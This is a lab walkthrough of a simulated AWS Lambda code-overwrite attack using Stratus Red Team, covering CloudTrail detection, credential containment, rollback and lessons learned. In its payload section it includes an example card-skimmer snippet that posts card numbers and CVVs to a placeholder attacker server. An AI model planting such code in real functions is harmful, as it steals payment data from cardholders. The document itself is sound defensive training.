Lambda overwrite walkthrough · MD
# Scenario 03 — Lambda Function Code Overwrite
 
## Overview
 
| Field | Detail |
|---|---|
| Technique | Overwrite Lambda Function Code |
| Stratus ID | `aws.persistence.lambda-overwrite-code` |
| MITRE ATT&CK | T1496 — Resource Hijacking / T1565.001 — Stored Data Manipulation |
| Tactic | Persistence, Impact |
| Severity | High |
| Date Executed | 2026-05-24 |
 
---
 
## Scenario Context
 
An attacker with valid IAM credentials overwrites a Lambda function's code with a malicious payload. The modified function continues executing on schedule or on trigger — silently exfiltrating data, skimming payments, or establishing a persistent backdoor — while appearing legitimate in the AWS console.
 
This technique mirrors real-world attacks including the 2025 Bybit hack where attackers modified transaction processing logic to redirect funds, and multiple fintech incidents where payment processor Lambda functions were injected with card skimmers.
 
---
 
## MITRE ATT&CK Mapping
 
```
Initial Access      T1078.004   Valid Accounts: Cloud Accounts
Persistence         T1546       Event Triggered Execution (Lambda on trigger)
Impact              T1565.001   Stored Data Manipulation
Defense Evasion     T1078       Valid Accounts (blends with legitimate deploys)
Lateral Movement    T1548       Abuse Elevation Control Mechanism (AssumeRole)
```
 
---
 
## Lab Execution
 
### Step 1 — Warmup
 
```powershell
.\stratus.exe warmup aws.persistence.lambda-overwrite-code
```
 
Stratus provisions a target Lambda function via Terraform.
 
### Step 2 — Detonate
 
```powershell
.\stratus.exe detonate aws.persistence.lambda-overwrite-code
```
 
Stratus overwrites the Lambda function code with a malicious payload. The function is now executing attacker-controlled code on every invocation.
 
---
 
## Detection
 
### GuardDuty Finding
 
```
Execution:Lambda/MaliciousActivity
  Function: stratus-red-team-olc-func-aywjpiyixm
  Region: us-east-1
  Time: 2026-05-24T14:21:44Z
```
 
### CloudTrail Analysis — Step 1: Find the modification
 
Query for `UpdateFunctionCode` — the API call that fires when Lambda code is changed:
 
```powershell
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionCode --region us-east-1
```
 
**Real CloudTrail finding captured:**
 
```json
{
    "EventName": "UpdateFunctionCode",
    "EventTime": "2026-05-24T14:21:44Z",
    "Username": "iamadminSCS-C03",
    "Resources": [
        {
            "ResourceType": "AWS::Lambda::Function",
            "ResourceName": "stratus-red-team-olc-func-aywjpiyixm"
        }
    ]
}
```
 
**Reading the finding:**
 
| Field | Value | Meaning |
|---|---|---|
| EventName | UpdateFunctionCode | Lambda code was modified |
| Username | iamadminSCS-C03 | Identity that made the change |
| EventTime | 2026-05-24T14:21:44Z | When it happened |
| ResourceName | stratus-red-team-olc-func-aywjpiyixm | Which function was hit |
 
### CloudTrail Analysis — Step 2: Track the pivot
 
Never stop at the first finding. Query everything the attacker did after the Lambda modification:
 
```powershell
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=iamadminSCS-C03 --region us-east-1
```
 
**Additional findings:**
 
```json
{
    "EventName": "AssumeRole",
    "AccessKeyId": "ASIA[REDACTED]",
    "Resources": [{
        "ResourceType": "AWS::IAM::Role",
        "ResourceName": "arn:aws:iam::1778[REDACTED]:role/aws-service-role/config.amazonaws.com/AWSServiceRoleForConfig"
    }]
}
```
 
```json
{
    "EventName": "ListDiscoveredResources",
    "ReadOnly": "true",
    "AccessKeyId": "ASIA[REDACTED]"
}
```
 
**Key observation — AKIA vs ASIA credentials:**
 
```
AKIA... = long-term IAM access key (permanent until rotated)
ASIA... = temporary credentials from an assumed role session
```
 
The attacker pivoted from their IAM user key (`AKIA`) to a temporary Config role session (`ASIA`). This is lateral movement — they now have a second identity operating independently.
 
**Full attack chain reconstructed:**
 
```
1. iamadminSCS-C03 (AKIA key) → UpdateFunctionCode → Lambda backdoored
2. iamadminSCS-C03 → AssumeRole → AWSServiceRoleForConfig
3. Config role (ASIA session) → ListDiscoveredResources → full account inventory
```
 
### Inspect the Payload
 
Pull the function code to see exactly what was injected:
 
```powershell
# Get the presigned S3 URL for the current function code
aws lambda get-function --function-name stratus-red-team-olc-func-aywjpiyixm
```
 
Download and inspect:
 
```powershell
Invoke-WebRequest -Uri "[Code.Location URL from above]" -OutFile compromised_lambda.zip
Expand-Archive -Path compromised_lambda.zip -DestinationPath compromised_lambda
cd compromised_lambda
Get-Content lambda.py
```
 
In this lab Stratus inserted a benign payload. In a real attack this would contain:
 
```python
import requests
requests.post(
    "http://attacker-server/collect",
    json={
        "card": event.get("card_number"),
        "cvv": event.get("cvv"),
        "amount": event.get("amount")
    },
    timeout=2
)
```
 
---
 
## Response
 
### Step 1 — Disable the compromised IAM key
 
```powershell
# List keys on the compromised user
aws iam list-access-keys --user-name iamadminSCS-C03
 
# Disable the key
aws iam update-access-key --user-name iamadminSCS-C03 --access-key-id AKIA[KEY-ID] --status Inactive
```
 
> ⚠️ **CRITICAL:** Confirm this is NOT the key you are currently using for IR before disabling. See Roadblocks section below.
 
### Step 2 — Attempt to revoke Config role session
 
Create the deny policy file:
 
```powershell
@"
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Action": "*",
    "Resource": "*",
    "Condition": {
      "DateLessThan": {
        "aws:TokenIssueTime": "2026-05-24T15:21:00Z"
      }
    }
  }]
}
"@ | Out-File -FilePath deny-policy.json -Encoding utf8 -NoNewline
```
 
Attempt to attach:
 
```powershell
aws iam put-role-policy --role-name AWSServiceRoleForConfig --policy-name RevokeActiveSessions --policy-document file://deny-policy.json
```
 
**Result:**
 
```
An error occurred (UnmodifiableEntity): Cannot perform the operation on the 
protected role 'AWSServiceRoleForConfig' - this role is only modifiable by AWS
```
 
**Why this fails — and what to do instead:**
 
```
AWS Service-Linked Roles (AWSServiceRoleFor...)
  → Created and owned by AWS internally
  → Cannot be modified, cannot attach inline policies
  → TokenIssueTime deny technique does NOT work here
 
Correct response:
  → Source IAM key already disabled ✅
  → Attacker cannot generate new role sessions ✅
  → Existing ASIA session expires naturally within 1 hour ✅
  → No further action required on the role itself
```
 
### Step 3 — Rollback Lambda to last known good version
 
```powershell
# Check available versions
aws lambda list-versions-by-function --function-name stratus-red-team-olc-func-aywjpiyixm
```
 
**If previous versions exist:**
 
```powershell
aws lambda update-alias --function-name stratus-red-team-olc-func-aywjpiyixm --name prod --function-version [LAST-GOOD-VERSION]
```
 
**If only $LATEST exists (as in this lab):**
 
Lambda versioning was not enabled — no rollback available. Redeploy from source control or CI/CD pipeline. This is a critical production gap.
 
---
 
## Roadblocks Encountered & How We Solved Them
 
### Roadblock 1 — Disabled our own IR key
 
**What happened:**
During containment we disabled the access key belonging to `iamadminSCS-C03` — the same key we were using to run AWS CLI commands. This immediately locked us out of the AWS CLI.
 
**Error:**
```
An error occurred (InvalidClientTokenId): The security token included in the request is invalid.
```
 
**How we solved it:**
Went to the AWS Console → IAM → reactivated the key, then created a new access key and reconfigured the CLI with `aws configure`.
 
**Lesson:**
```
Always verify which key you are actively using before disabling anything.
aws sts get-caller-identity → shows your current AccessKeyId
Compare it against the key you're about to disable.
 
Production best practice:
  → Dedicated break-glass IR account with separate credentials
  → Stored offline or in a secrets vault
  → Never used for day-to-day work
  → Only activated during incidents
```
 
---
 
### Roadblock 2 — Service-linked role could not be modified
 
**What happened:**
Attempted to attach a `TokenIssueTime` deny policy to `AWSServiceRoleForConfig` to kill the attacker's active session. AWS blocked it.
 
**Error:**
```
An error occurred (UnmodifiableEntity): Cannot perform the operation on the 
protected role 'AWSServiceRoleForConfig'
```
 
**How we solved it:**
Recognized that service-linked roles are AWS-managed and cannot be modified. Since the source IAM key was already disabled, the attacker could not generate new sessions. We allowed the existing temporary session to expire naturally within its 1-hour TTL.
 
**Lesson:**
```
AWS Service-Linked Roles (prefix: AWSServiceRoleFor...)
  → Owned by AWS, not modifiable by account admins
  → TokenIssueTime deny policy does NOT apply
  → Cannot be deleted while the service depends on them
 
When an attacker assumes a service-linked role:
  → Disable the source IAM credentials immediately
  → Attacker cannot get new sessions
  → Existing session expires within 1 hour maximum
  → Monitor CloudTrail for any activity during the expiry window
```
 
---
 
### Roadblock 3 — No Lambda versions available for rollback
 
**What happened:**
Ran `list-versions-by-function` and found only `$LATEST` — no previous versions to roll back to.
 
**How we solved it:**
In the lab, accepted the limitation and noted it as a gap. In production, this would require redeployment from source control.
 
**Lesson:**
```
Always enable Lambda versioning in production:
  → Publish a new version on every deployment
  → Maintain at least 3 previous versions
  → Use aliases (prod, staging) pointing to specific versions
  → Rollback = update alias to previous version (seconds, not minutes)
 
Without versioning:
  → No rollback capability
  → Attacker code is the only version
  → Recovery requires CI/CD redeployment (minutes to hours)
```
 
---
 
### Roadblock 4 — Inline JSON breaking in PowerShell
 
**What happened:**
Attempted to pass JSON policy document inline in a PowerShell command. PowerShell's handling of quotes and special characters caused parsing errors.
 
**How we solved it:**
Used PowerShell here-strings to write the JSON to a file first, then referenced it with `file://`:
 
```powershell
# Write JSON to file using here-string (no escaping needed)
@"
{ "Version": "2012-10-17", ... }
"@ | Out-File -FilePath policy.json -Encoding utf8 -NoNewline
 
# Reference file in AWS CLI command
aws iam put-role-policy --policy-document file://policy.json
```
 
**Lesson:**
```
PowerShell here-string pattern:
  @" ... "@ | Out-File -FilePath filename.json -Encoding utf8 -NoNewline
 
Use file:// prefix for any AWS CLI policy document parameter.
This works for: --policy-document, --assume-role-policy-document,
                --access-control-policy, --lifecycle-configuration
```
 
---
 
## Key Lessons
 
**1. Don't disable your own IR key**
Verify your active credentials with `aws sts get-caller-identity` before disabling anything. Always have a break-glass account with separate offline credentials for incident response.
 
**2. CloudTrail tells the full pivot story**
The Lambda modification was the first event — not the last. By querying all activity by the attacker's username we discovered an AssumeRole pivot to the Config service role and subsequent environment enumeration. Never stop at the first finding.
 
**3. AKIA vs ASIA credentials**
```
AKIA = permanent IAM key → disable immediately
ASIA = temporary assumed role session → expires within 1 hour
       disable the source key to prevent new sessions
```
 
**4. Rollback over delete**
Deleting a Lambda function destroys production and eliminates forensic evidence. Rollback to a previous version restores service in seconds and preserves the malicious code for analysis. Enable versioning on all production Lambda functions.
 
**5. Service-linked roles are AWS-managed**
The `TokenIssueTime` deny technique only works on customer-managed roles. For service-linked roles, disable the source credentials and let temporary sessions expire naturally.
 
**6. Lambda versioning is non-negotiable in production**
No versioning = no rollback = recovery depends on CI/CD pipeline speed. Publish versions on every deployment. This is both an operational resilience and a security incident response requirement.
 
---
 
## Cleanup
 
```powershell
.\stratus.exe cleanup aws.persistence.lambda-overwrite-code
```
 
Also remove the inline deny policy if it was successfully attached to any role:
 
```powershell
aws iam delete-role-policy --role-name [ROLE-NAME] --policy-name RevokeActiveSessions
```
 
---
 
## CloudTrail Command Reference (from this scenario)
 
```powershell
# Find Lambda code modifications
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionCode --region us-east-1
 
# Find all activity by a specific user
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=iamadminSCS-C03 --region us-east-1
 
# Find role assumption events
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole --region us-east-1
 
# Find activity by a specific access key
aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=ASIA[KEY] --region us-east-1
 
# Check current identity (always run before disabling keys)
aws sts get-caller-identity
 
# List Lambda versions
aws lambda list-versions-by-function --function-name [FUNCTION-NAME]
 
# Get function code location
aws lambda get-function --function-name [FUNCTION-NAME]
 
# Disable IAM access key
aws iam update-access-key --user-name [USERNAME] --access-key-id [KEY-ID] --status Inactive
```
 
---
 
## References
 
- [Stratus Red Team — aws.persistence.lambda-overwrite-code](https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.lambda-overwrite-code/)
- [MITRE ATT&CK T1565.001 — Stored Data Manipulation](https://attack.mitre.org/techniques/T1565/001/)
- [AWS Lambda Versioning and Aliases](https://docs.aws.amazon.com/lambda/latest/dg/configuration-versions.html)
- [AWS Service-Linked Roles](https://docs.aws.amazon.com/IAM/latest/UserGuide/using-service-linked-roles.html)
- [Revoking IAM Role Temporary Credentials](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_revoke-sessions.html)
